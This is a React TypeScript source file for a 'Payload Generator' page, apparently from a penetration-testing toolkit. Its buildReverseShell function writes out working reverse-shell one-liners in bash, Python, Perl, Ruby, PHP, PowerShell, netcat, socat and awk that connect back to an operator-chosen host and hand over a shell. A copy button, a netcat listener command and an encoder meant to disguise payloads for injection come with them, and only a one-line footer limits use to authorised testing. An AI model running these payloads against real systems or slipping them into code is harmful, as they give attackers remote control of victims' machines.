import { useState, useCallback } from "react";
import { Copy, CheckCircle, Terminal, RefreshCw, Code } from "lucide-react";
import { Card, CardBody, CardHeader } from "@/shared/components/Card";
import { Badge } from "@/shared/components/Badge";
import { Button } from "@/shared/components/Button";

// ---------------------------------------------------------------------------
// Reverse shell payloads
// ---------------------------------------------------------------------------

type ShellType = "bash" | "python" | "python3" | "perl" | "ruby" | "php" | "powershell" | "nc" | "socat" | "awk";

function buildReverseShell(type: ShellType, ip: string, port: number): string {
  const p = port.toString();
  switch (type) {
    case "bash":
      return `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
    case "python":
      return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`;
    case "python3":
      return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`;
    case "perl":
      return `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`;
    case "ruby":
      return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
    case "php":
      return `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    case "powershell":
      return `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    case "nc":
      return `nc -e /bin/sh ${ip} ${p}`;
    case "socat":
      return `socat TCP:${ip}:${p} EXEC:/bin/sh`;
    case "awk":
      return `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
  }
}

// ---------------------------------------------------------------------------
// Encoding helpers
// ---------------------------------------------------------------------------

type EncoderType = "base64" | "url" | "hex" | "html_entity" | "unicode";

function encodePayload(input: string, method: EncoderType): string {
  try {
    switch (method) {
      case "base64":
        return btoa(unescape(encodeURIComponent(input)));
      case "url":
        return encodeURIComponent(input);
      case "hex":
        return Array.from(input)
          .map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0").toUpperCase()}`)
          .join("");
      case "html_entity":
        return Array.from(input)
          .map((c) => `&#${c.charCodeAt(0)};`)
          .join("");
      case "unicode":
        return Array.from(input)
          .map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`)
          .join("");
    }
  } catch {
    return "[encoding error]";
  }
}

// ---------------------------------------------------------------------------
// Copy button
// ---------------------------------------------------------------------------

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = useCallback(() => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }, [text]);
  return (
    <button onClick={handleCopy} className="shrink-0 ml-2" title="Copy">
      {copied
        ? <CheckCircle className="h-3.5 w-3.5" style={{ color: "var(--success-400)" }} />
        : <Copy className="h-3.5 w-3.5" style={{ color: "var(--text-tertiary)" }} />}
    </button>
  );
}

// ---------------------------------------------------------------------------
// Page
// ---------------------------------------------------------------------------

const SHELL_TYPES: Array<{ value: ShellType; label: string }> = [
  { value: "bash", label: "Bash" },
  { value: "python", label: "Python 2" },
  { value: "python3", label: "Python 3" },
  { value: "perl", label: "Perl" },
  { value: "ruby", label: "Ruby" },
  { value: "php", label: "PHP" },
  { value: "powershell", label: "PowerShell" },
  { value: "nc", label: "Netcat" },
  { value: "socat", label: "Socat" },
  { value: "awk", label: "Awk" },
];

const ENCODER_TYPES: Array<{ value: EncoderType; label: string }> = [
  { value: "base64", label: "Base64" },
  { value: "url", label: "URL encode" },
  { value: "hex", label: "Hex (%XX)" },
  { value: "html_entity", label: "HTML entities" },
  { value: "unicode", label: "Unicode \\uXXXX" },
];

export function PayloadGeneratorPage() {
  // Reverse shell state
  const [shellType, setShellType] = useState<ShellType>("bash");
  const [lhostIp, setLhostIp] = useState("10.10.10.10");
  const [lport, setLport] = useState(4444);

  // Encoder state
  const [encoderInput, setEncoderInput] = useState("");
  const [encoderType, setEncoderType] = useState<EncoderType>("base64");

  const shellPayload = buildReverseShell(shellType, lhostIp, lport);
  const encodedPayload = encoderInput ? encodePayload(encoderInput, encoderType) : "";

  return (
    <div className="space-y-6 max-w-3xl">
      <div>
        <h1 className="text-xl font-semibold" style={{ color: "var(--text-primary)" }}>
          Payload Generator
        </h1>
        <p className="text-sm mt-1" style={{ color: "var(--text-secondary)" }}>
          Generate reverse shell payloads and encode strings for injection testing.
        </p>
      </div>

      {/* Reverse Shell Generator */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <Terminal className="h-4 w-4" style={{ color: "var(--brand-500)" }} />
            <p className="text-sm font-semibold" style={{ color: "var(--text-primary)" }}>Reverse Shell Generator</p>
          </div>
        </CardHeader>
        <CardBody className="space-y-4">
          <div className="flex flex-wrap gap-3">
            <div>
              <label className="text-xs font-medium block mb-1" style={{ color: "var(--text-secondary)" }}>LHOST (your IP)</label>
              <input
                value={lhostIp}
                onChange={(e) => setLhostIp(e.target.value)}
                className="rounded-md border px-3 py-1.5 text-xs font-mono w-40"
                style={{ background: "var(--bg-elevated)", borderColor: "var(--border-default)", color: "var(--text-primary)" }}
              />
            </div>
            <div>
              <label className="text-xs font-medium block mb-1" style={{ color: "var(--text-secondary)" }}>LPORT</label>
              <input
                type="number"
                value={lport}
                onChange={(e) => setLport(Number(e.target.value))}
                className="rounded-md border px-3 py-1.5 text-xs font-mono w-24"
                style={{ background: "var(--bg-elevated)", borderColor: "var(--border-default)", color: "var(--text-primary)" }}
              />
            </div>
          </div>

          <div className="flex flex-wrap gap-1.5">
            {SHELL_TYPES.map(({ value, label }) => (
              <button
                key={value}
                onClick={() => setShellType(value)}
                className="rounded-md px-2.5 py-1 text-xs font-medium transition-colors"
                style={{
                  background: shellType === value ? "var(--bg-surface)" : "var(--bg-base)",
                  color: shellType === value ? "var(--text-primary)" : "var(--text-tertiary)",
                  border: `1px solid ${shellType === value ? "var(--brand-500)" : "var(--border-default)"}`,
                }}
              >
                {label}
              </button>
            ))}
          </div>

          <div className="flex items-start gap-2">
            <pre
              className="flex-1 rounded-md p-3 text-xs font-mono overflow-x-auto whitespace-pre-wrap break-all"
              style={{ background: "var(--bg-base)", color: "var(--success-400)", minHeight: 56 }}
            >
              {shellPayload}
            </pre>
            <CopyButton text={shellPayload} />
          </div>

          <p className="text-xs" style={{ color: "var(--text-tertiary)" }}>
            Listener: <code className="font-mono">nc -lvnp {lport}</code>
          </p>
        </CardBody>
      </Card>

      {/* Payload Encoder */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <Code className="h-4 w-4" style={{ color: "var(--brand-500)" }} />
            <p className="text-sm font-semibold" style={{ color: "var(--text-primary)" }}>Payload Encoder</p>
          </div>
        </CardHeader>
        <CardBody className="space-y-4">
          <div>
            <label className="text-xs font-medium block mb-1" style={{ color: "var(--text-secondary)" }}>Input</label>
            <textarea
              value={encoderInput}
              onChange={(e) => setEncoderInput(e.target.value)}
              rows={3}
              placeholder="Paste payload to encode..."
              className="w-full rounded-md border px-3 py-2 text-xs font-mono resize-none"
              style={{ background: "var(--bg-elevated)", borderColor: "var(--border-default)", color: "var(--text-primary)" }}
            />
          </div>

          <div className="flex flex-wrap gap-1.5">
            {ENCODER_TYPES.map(({ value, label }) => (
              <button
                key={value}
                onClick={() => setEncoderType(value)}
                className="rounded-md px-2.5 py-1 text-xs font-medium transition-colors"
                style={{
                  background: encoderType === value ? "var(--bg-surface)" : "var(--bg-base)",
                  color: encoderType === value ? "var(--text-primary)" : "var(--text-tertiary)",
                  border: `1px solid ${encoderType === value ? "var(--brand-500)" : "var(--border-default)"}`,
                }}
              >
                {label}
              </button>
            ))}
          </div>

          {encodedPayload && (
            <div className="flex items-start gap-2">
              <pre
                className="flex-1 rounded-md p-3 text-xs font-mono overflow-x-auto whitespace-pre-wrap break-all"
                style={{ background: "var(--bg-base)", color: "var(--brand-400)", minHeight: 48 }}
              >
                {encodedPayload}
              </pre>
              <CopyButton text={encodedPayload} />
            </div>
          )}
        </CardBody>
      </Card>

      <div
        className="flex items-center gap-2 rounded-md px-3 py-2 text-xs"
        style={{ background: "rgba(245,158,11,0.1)", borderLeft: "3px solid var(--warning-500)" }}
      >
        <RefreshCw className="h-3.5 w-3.5 shrink-0" style={{ color: "var(--warning-400)" }} />
        <span style={{ color: "var(--warning-300)" }}>
          For authorized penetration testing only. Reverse shells require a listener on your LHOST.
        </span>
      </div>
    </div>
  );
}
